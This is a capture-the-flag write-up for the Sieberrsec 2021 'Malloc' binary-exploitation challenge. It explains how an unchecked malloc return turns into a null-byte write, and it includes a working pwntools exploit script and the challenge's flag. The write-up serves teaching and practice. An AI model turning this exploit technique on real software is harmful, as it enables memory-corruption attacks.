---
title: "Sieberrsec 3.0 CTF (2021) - Malloc (Pwn)"
header:
  overlay_image: /assets/images/sieberrsec3.0/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Sieberrsec 3.0 CTF Organisers"

tags:
  - sieberrsec
  - writeup
  - pwn
  - malloc
  - null dereference
---

Summary: Control of the size parameter to malloc and a subsequent lack of checking that the returned
pointer is not 0 leads to an arbitrary null byte write to sensitive addresses such as a global
variable. This variable is then used in a check condition to allow the printing of a flag.

## Challenge Prompt

```c
malloc
Binary Exploitation

Solves (2) - 400 Points

Can you somehow get the flag? Have fun!

nc challs.sieberrsec.tech 1470

#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>

// cc malloc.c -o malloc -fstack-protector-all
int main(void)
{
	// Variables
	int *arr; // int pointer to an array
	char *msg; // C-string to store your message
	size_t length = 0;

	// Welcome message
	puts("Welcome to Sieberrsec CTF!");

	// Allocates 123456 bytes of memory
	arr = (int *)malloc(123456);

	// Sets first element of arr to 1
	arr[0] = 1;

	// Leaks the memory address of arr
	printf("Leak: %p\n", arr);

	// Gets length of your message
	printf("Length of your message: ");
	scanf("%lu", &length);

	// Allocates memory to store your message as a C-string
	// +1 is to store the null-byte that ends the string
	msg = malloc(length + 1);

	// Reads length bytes of input into msg
	printf("Enter your message: ");
	read(0, msg, length);

	// Null-byte to end the string
	msg[length] = 0;

	// Write length bytes from msg
	write(1, msg, length);

	// Your goal: somehow make arr[0] == 0
	if (arr[0] == 0) {
		system("cat flag");
	}
	return 0;
}

```

## Solution

First, we compile the program according to the challenge prompt.

```console
$ cc malloc.c -o malloc -fstack-protector-all
```

We can run this without any buffering with the following command. From the source code and the
dynamic behaviour of the program, we can observe that there should not be any buffer overflow issues
here since the calculation of the length appears to be sound and no integer type confusion is
occurring.

```console
$ stdbuf -i0 -o0 -e0 ./malloc
Welcome to Sieberrsec CTF!
Leak: 0x1cb9010
Length of your message: 100
Enter your message: AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAA
```

Instead, the issue here is that the return value of malloc is not checked. On any sufficiently large
size provided, the return value of the call will return zero.

```console
$ $ ltrace ./malloc
__libc_start_main(0x400766, 1, 0x7fff90b069b8, 0x400870 <unfinished ...>
puts("Welcome to Sieberrsec CTF!"Welcome to Sieberrsec CTF!
)                                           = 27
malloc(123456)                                                               = 0x1588420
printf("Leak: %p\n", 0x1588420Leak: 0x1588420
)                                              = 16
printf("Length of your message: ")                                           = 24
__isoc99_scanf(0x400932, 0x7fff90b068b0, 0x7f73d935b780, 24Length of your message: 9999999999999
)                 = 1
malloc(10000000000000)                                                       = 0
printf("Enter your message: ")                                               = 20
read(0A
, nil, 9999999999999)                                                  = -1
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

This behaviour in conjunction with the following line of code gives us an arbitrary zero byte write
primitive to any address.

```c
	// Null-byte to end the string
	msg[length] = 0;
```

Since the goal is to write to this array using the leaked address, we can use the primitive by
simply providing the leaked address as the length. This eventually resolves to `&0[leak] = 0`
which writes a zero byte to the exact address we require.

```c
    // Allocates 123456 bytes of memory
	arr = (int *)malloc(123456);

	// Sets first element of arr to 1
	arr[0] = 1;

	// Leaks the memory address of arr
	printf("Leak: %p\n", arr);

    ...

	// Your goal: somehow make arr[0] == 0
	if (arr[0] == 0) {
		system("cat flag");
	}
	return 0;
```

Putting this all together in an exploit gives us:

```python
#!/usr/bin/env python

from pwn import *


def main():
    p = remote('challs.sieberrsec.tech', 1470)

    # Get the leaked address.
    p.recvuntil(b'Leak: ')
    leak = int(p.recvline().strip(), 16)
    log.info('Leaked Address: {}'.format(hex(leak)))

    # Send the size of the leaked address to write a zero at it.
    log.info('Allocating {} bytes.'.format(leak))
    p.sendline(str(leak).encode())

    # Send a bogus message.
    p.recvuntil(b'Enter your message: ')
    log.info('Sending bogus message')
    p.sendline(b'amon')

    # Get the flag.
    flag = p.recvline().strip()
    log.success('Flag: {}'.format(flag.decode()))


if __name__ == '__main__':
    main()
```

Running the script gives us the flag:

```console
$ python exploit.py
[+] Opening connection to challs.sieberrsec.tech on port 1470: Done
[*] Leaked Address: 0x55f3fd5952a0
[*] Allocating 94506415903392 bytes.
[*] Sending bogus message
[+] Flag: IRS{Y0U_4R3_4W350M3_CJAVFSHA}
[*] Closed connection to challs.sieberrsec.tech port 1470
```

**Flag:** `IRS{Y0U_4R3_4W350M3_CJAVFSHA}`
